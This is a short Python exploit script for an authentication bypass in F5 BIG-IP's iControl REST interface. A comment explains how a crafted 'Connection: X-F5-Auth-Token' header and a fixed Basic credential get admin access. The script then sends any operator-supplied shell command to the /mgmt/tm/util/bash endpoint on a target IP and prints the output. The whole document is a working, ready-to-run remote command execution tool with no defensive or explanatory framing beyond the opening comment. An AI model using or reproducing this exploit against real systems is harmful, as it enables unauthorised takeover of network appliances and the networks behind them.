# Idea: 
# 1. Use Connection: X-F5-Auth-Token to trigger mod_f5_auth_token.so remove X-F5-Auth-Token in forward request to local REST API
# 2. Use YWRtaW46dGVzdA to set admin role (rest doesn't verify password)
import argparse, urllib3
from requests import post

urllib3.disable_warnings()

def exploit(target, command):
    url = 'https://{0}/mgmt/tm/util/bash'.format(target)
    headers = {
        'Host': 'localhost',
        'Authorization': 'Basic YWRtaW46dGVzdA==',
        'X-F5-Auth-Token': 'veryrandomstring',        
        'Content-Type': 'application/json',
        'Connection': 'X-F5-Auth-Token'
    }
    command = 'id' if command is None else command
    data = {
        "command":"run",
        "utilCmdArgs":"-c '{0}'".format(command)
    }
    
    res = post(url, headers=headers, json=data, verify=False)
    print(res.json()['commandResult'].strip())

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target IP', required=True)
    parser.add_argument('-c', '--command', help='Command Execute')
    args = parser.parse_args()

    exploit(args.target, args.command)